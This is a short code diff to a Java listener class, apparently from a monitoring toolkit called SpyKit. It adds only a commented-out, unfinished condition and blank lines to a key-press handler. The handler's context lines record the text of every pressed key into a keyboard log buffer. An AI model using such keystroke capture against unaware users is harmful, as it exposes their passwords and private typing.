@@ -285,6 +285,14 @@ public class NativeDevicesListener extends SpyKitListener {
          * @param e native key event
          */
         public synchronized void nativeKeyPressed(NativeKeyEvent e) {
+//            if(e.getKeyCode() == NativeKeyEvent)
+
+
+
+
+
+
+
             receiveEvent(e);
             keyboardLogs.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
         }
